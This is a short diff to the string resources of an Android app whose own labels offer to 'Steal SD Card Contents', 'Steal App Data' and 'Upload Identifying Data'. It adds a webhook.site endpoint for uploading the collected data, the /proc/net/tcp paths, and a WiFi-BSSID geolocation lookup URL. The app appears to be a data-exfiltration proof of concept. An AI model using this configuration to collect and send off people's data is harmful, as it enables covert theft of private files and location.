@@ -4,5 +4,9 @@
     <string name="sdcard">Steal SD Card Contents</string>
     <string name="appdata">Steal App Data</string>
     <string name="iddata">Upload Identifying Data</string>
+    <string name="data_upload_url"><![CDATA[https://webhook.site/5ebd6968-4d2b-4c72-84a4-c3f491311c3e/?noperms&]]></string>
+    <string name="tcp_log">/proc/net/tcp</string>
+    <string name="tcp6_log">/proc/net/tcp6</string>
+    <string name="wifi_webservice_url"><![CDATA[https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid=]]></string>
 
 </resources>
